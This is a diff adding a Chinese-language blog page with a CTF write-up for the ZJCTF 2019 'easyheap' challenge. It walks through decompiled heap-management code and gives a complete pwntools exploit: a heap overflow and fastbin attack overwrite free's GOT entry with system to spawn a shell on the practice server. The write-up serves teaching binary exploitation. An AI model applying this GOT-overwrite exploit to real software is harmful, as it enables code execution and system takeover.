@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="这一题的预期解因为buu的docker环境问题无法实现 这里使用的是通过覆盖free_got表为system来系统调用 分析一下程序 [*] &amp;#x27;&#x2F;home&#x2F;chen&#x2F;pwn&amp;#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enab">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ZJCTF 2019.easyheap">
+<meta property="og:url" content="http://example.com/2022/11/21/ZJCTF-2019-easyheap/index.html">
+<meta property="og:site_name" content="C12en">
+<meta property="og:description" content="这一题的预期解因为buu的docker环境问题无法实现 这里使用的是通过覆盖free_got表为system来系统调用 分析一下程序 [*] &amp;#x27;&#x2F;home&#x2F;chen&#x2F;pwn&amp;#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enab">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pic.imgdb.cn/item/637b445a16f2c2beb146a7b9.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/637b451116f2c2beb147a1a0.png">
+<meta property="article:published_time" content="2022-11-21T09:05:17.000Z">
+<meta property="article:modified_time" content="2023-09-14T17:21:00.627Z">
+<meta property="article:author" content="C12en">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.imgdb.cn/item/637b445a16f2c2beb146a7b9.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;">
+        
+      
+    
+    <!-- title -->
+    <title>ZJCTF 2019.easyheap</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="C12en" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/11/21/unsortedbinAttack/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/11/18/Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/11/21/ZJCTF-2019-easyheap/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/11/21/ZJCTF-2019-easyheap/&text=ZJCTF 2019.easyheap"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/11/21/ZJCTF-2019-easyheap/&title=ZJCTF 2019.easyheap"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/11/21/ZJCTF-2019-easyheap/&is_video=false&description=ZJCTF 2019.easyheap"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ZJCTF 2019.easyheap&body=Check out this article: http://example.com/2022/11/21/ZJCTF-2019-easyheap/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/11/21/ZJCTF-2019-easyheap/&title=ZJCTF 2019.easyheap"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/11/21/ZJCTF-2019-easyheap/&title=ZJCTF 2019.easyheap"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/11/21/ZJCTF-2019-easyheap/&title=ZJCTF 2019.easyheap"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/11/21/ZJCTF-2019-easyheap/&title=ZJCTF 2019.easyheap"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/11/21/ZJCTF-2019-easyheap/&name=ZJCTF 2019.easyheap&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/11/21/ZJCTF-2019-easyheap/&t=ZJCTF 2019.easyheap"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        ZJCTF 2019.easyheap
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">C12en</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-11-21T09:05:17.000Z" class="dt-published" itemprop="datePublished">2022-11-21</time>
+        
+        (Updated: <time datetime="2023-09-14T17:21:00.627Z" class="dt-updated" itemprop="dateModified">2023-09-15</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/wp/">wp</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>这一题的预期解因为buu的docker环境问题无法实现 这里使用的是通过覆盖free_got表为system来系统调用</p>
+<p>分析一下程序</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/chen/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<p>没有开启FULL RELRO 意味着可以覆写got表</p>
+<p>ida继续跟进 main函数很常规 这里重点关注一下add free edit这三个函数</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">create_heap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">size_t</span> size; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*(&amp;heaparray + i) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size of Heap : &quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">      size = atoi(buf);</span><br><span class="line">      *(&amp;heaparray + i) = <span class="built_in">malloc</span>(size);</span><br><span class="line">      <span class="keyword">if</span> ( !*(&amp;heaparray + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Allocate Error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Content of heap:&quot;</span>);</span><br><span class="line">      read_input(*(&amp;heaparray + i), size);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;SuccessFul&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>申请的堆块存储到了bss段上的heaparray数组里面 同时每个指针占据8个字节</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">edit_heap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;heaparray + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Size of Heap : &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">    v2 = atoi(buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Content of heap : &quot;</span>);</span><br><span class="line">    read_input(*(&amp;heaparray + v1), v2);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No such heap !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>提供了堆溢出的机会 可以供我们修改size域来合并chunk</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">delete_heap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;heaparray + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*(&amp;heaparray + v1));</span><br><span class="line">    *(&amp;heaparray + v1) = <span class="number">0LL</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No such heap !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>free后把指针清零了 没有办法uaf</p>
+<p>了解完程序主体后 结合一下版本为ubuntu16 没有tcache 并且还有堆溢出 可以合并堆块 从而获得两个指向同一空间的chunk 这样就可以修改fastbinchunk的fd域 获得任意地址写的机会</p>
+<p>接着再来关注一下这个heaparray 我们看完了代码后 可以得知  edit函数 是修改heaparray所指向的地址的内容</p>
+<p>那如果我们利用上文提到的任意写的漏洞 将heaparray的其中一个指针修改为free_got 那么不就可以修改got表 成功进行系统调用了</p>
+<p>不过fastbin attack需要注意的是  glibc对其取出bin时有检查机制  我们的fakechunk的地址需要合理构造 才能成功取出</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29611</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size of Heap : &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content of heap:&quot;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;SuccessFul&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size of Heap : &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content of heap : &quot;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Done !&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Done !&quot;</span>)</span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">system_addr = <span class="number">0x400700</span></span><br><span class="line">heaparray_addr = <span class="number">0x6020E0</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&quot;1&quot;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&quot;1&quot;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&quot;1&quot;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&quot;1&quot;</span>)<span class="comment">#3</span></span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+p16(<span class="number">0xe1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&quot;1&quot;</span>)<span class="comment">#4&amp;1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&quot;1&quot;</span>)<span class="comment">#5&amp;2</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">payload = p64(heaparray_addr-<span class="number">51</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure>
+
+<p>这部分代码的思路 我前面几题堆wp也有涉及 老办法了 不懂具体流程的可以翻看以往wp</p>
+<p>重点在于最后我们要任意写的地方 位于heaparray-51的地方 这是为什么？ 我们gdb动调看看</p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/637b445a16f2c2beb146a7b9.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/637b445a16f2c2beb146a7b9.png"></a></p>
+<p>如果不-51的话 此时我们想要伪造的chunk的size域值为878030 不符合glibc的检查机制 如果想要申请出来时 程序就会强行终止</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[DEBUG] Received 0x9b3 bytes:</span><br><span class="line">    b&quot;*** Error in `./pwn&#x27;: malloc(): memory corruption (fast): 0x00000000006020f0 ***\n&quot;</span><br><span class="line">    b&#x27;======= Backtrace: =========\n&#x27;</span><br><span class="line">    b&#x27;/lib/x86_64-linux-gnu/libc.so.6(+0x777f5)[0x7f93309967f5]\n&#x27;</span><br><span class="line">    b&#x27;/lib/x86_64-linux-gnu/libc.so.6(+0x82679)[0x7f93309a1679]\n&#x27;</span><br><span class="line">    b&#x27;/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7f93309a31d4]\n&#x27;</span><br><span class="line">    b&#x27;./pwn[0x4009b5]\n&#x27;</span><br><span class="line">    b&#x27;./pwn[0x400ce1]\n&#x27;</span><br><span class="line">    b&#x27;/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f933093f840]\n&#x27;</span><br><span class="line">    b&#x27;./pwn[0x4007b9]\n&#x27;</span><br><span class="line">    b&#x27;======= Memory map: ========\n&#x27;</span><br><span class="line">    b&#x27;00400000-00402000 r-xp 00000000 08:01 1066204                            /home/chen/pwn\n&#x27;</span><br><span class="line">    b&#x27;00601000-00602000 r--p 00001000 08:01 1066204                            /home/chen/pwn\n&#x27;</span><br><span class="line">    b&#x27;00602000-00603000 rw-p 00002000 08:01 1066204                            /home/chen/pwn\n&#x27;</span><br><span class="line">    b&#x27;02381000-023a2000 rw-p 00000000 00:00 0                                  [heap]\n&#x27;</span><br><span class="line">    b&#x27;7f932c000000-7f932c021000 rw-p 00000000 00:00 0 \n&#x27;</span><br><span class="line">    b&#x27;7f932c021000-7f9330000000 ---p 00000000 00:00 0 \n&#x27;</span><br><span class="line">    b&#x27;7f9330709000-7f933071f000 r-xp 00000000 08:01 136633                     /lib/x86_64-linux-gnu/libgcc_s.so.1\n&#x27;</span><br><span class="line">    b&#x27;7f933071f000-7f933091e000 ---p 00016000 08:01 136633                     /lib/x86_64-linux-gnu/libgcc_s.so.1\n&#x27;</span><br><span class="line">    b&#x27;7f933091e000-7f933091f000 rw-p 00015000 08:01 136633                     /lib/x86_64-linux-gnu/libgcc_s.so.1\n&#x27;</span><br><span class="line">    b&#x27;7f933091f000-7f9330adf000 r-xp 00000000 08:01 155906                     /lib/x86_64-linux-gnu/libc-2.23.so\n&#x27;</span><br><span class="line">    b&#x27;7f9330adf000-7f9330cdf000 ---p 001c0000 08:01 155906                     /lib/x86_64-linux-gnu/libc-2.23.so\n&#x27;</span><br><span class="line">    b&#x27;7f9330cdf000-7f9330ce3000 r--p 001c0000 08:01 155906                     /lib/x86_64-linux-gnu/libc-2.23.so\n&#x27;</span><br><span class="line">    b&#x27;7f9330ce3000-7f9330ce5000 rw-p 001c4000 08:01 155906                     /lib/x86_64-linux-gnu/libc-2.23.so\n&#x27;</span><br><span class="line">    b&#x27;7f9330ce5000-7f9330ce9000 rw-p 00000000 00:00 0 \n&#x27;</span><br><span class="line">    b&#x27;7f9330ce9000-7f9330d0f000 r-xp 00000000 08:01 155898                     /lib/x86_64-linux-gnu/ld-2.23.so\n&#x27;</span><br><span class="line">    b&#x27;7f9330ef4000-7f9330ef7000 rw-p 00000000 00:00 0 \n&#x27;</span><br><span class="line">    b&#x27;7f9330f0d000-7f9330f0e000 rw-p 00000000 00:00 0 \n&#x27;</span><br><span class="line">    b&#x27;7f9330f0e000-7f9330f0f000 r--p 00025000 08:01 155898                     /lib/x86_64-linux-gnu/ld-2.23.so\n&#x27;</span><br><span class="line">    b&#x27;7f9330f0f000-7f9330f10000 rw-p 00026000 08:01 155898                     /lib/x86_64-linux-gnu/ld-2.23.so\n&#x27;</span><br><span class="line">    b&#x27;7f9330f10000-7f9330f11000 rw-p 00000000 00:00 0 \n&#x27;</span><br><span class="line">    b&#x27;7ffc6a9c0000-7ffc6a9e1000 rw-p 00000000 00:00 0                          [stack]\n&#x27;</span><br><span class="line">    b&#x27;7ffc6a9ed000-7ffc6a9f0000 r--p 00000000 00:00 0                          [vvar]\n&#x27;</span><br><span class="line">    b&#x27;7ffc6a9f0000-7ffc6a9f2000 r-xp 00000000 00:00 0                          [vdso]\n&#x27;</span><br><span class="line">    b&#x27;ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]\n&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>于是我们只好利用gdb动调 最后在-51的位置 可以使我们构造的chunk结构通过glibc的检查</p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/637b451116f2c2beb147a1a0.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/637b451116f2c2beb147a1a0.png"></a></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x68</span>,<span class="string">b&quot;/bin/sh&quot;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">51</span>)+p64(free_got)</span><br><span class="line">edit(<span class="number">5</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">payload = p64(system_addr)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>随后我们将该chunk申请出来 并且计算一下偏移 将我们想要修改的heaparray覆盖成free_got </p>
+<p>这样我们下次想要利用edit函数修改其内容时  就会转化成修改free_got的内容</p>
+<p>然后我们释放掉一个内容为&#x2F;bin&#x2F;sh的堆块 就相当于执行了system（”&#x2F;bin&#x2F;sh”）</p>
+<p>但是在这里我遇到了个问题  不能使用我们之前为了方便打包好的函数</p>
+<p>因为多接收了个done  但是系统调用后并不会输出done 所以这里会有卡壳</p>
+</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/11/21/ZJCTF-2019-easyheap/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/11/21/ZJCTF-2019-easyheap/&text=ZJCTF 2019.easyheap"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/11/21/ZJCTF-2019-easyheap/&title=ZJCTF 2019.easyheap"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/11/21/ZJCTF-2019-easyheap/&is_video=false&description=ZJCTF 2019.easyheap"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ZJCTF 2019.easyheap&body=Check out this article: http://example.com/2022/11/21/ZJCTF-2019-easyheap/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/11/21/ZJCTF-2019-easyheap/&title=ZJCTF 2019.easyheap"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/11/21/ZJCTF-2019-easyheap/&title=ZJCTF 2019.easyheap"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/11/21/ZJCTF-2019-easyheap/&title=ZJCTF 2019.easyheap"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/11/21/ZJCTF-2019-easyheap/&title=ZJCTF 2019.easyheap"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
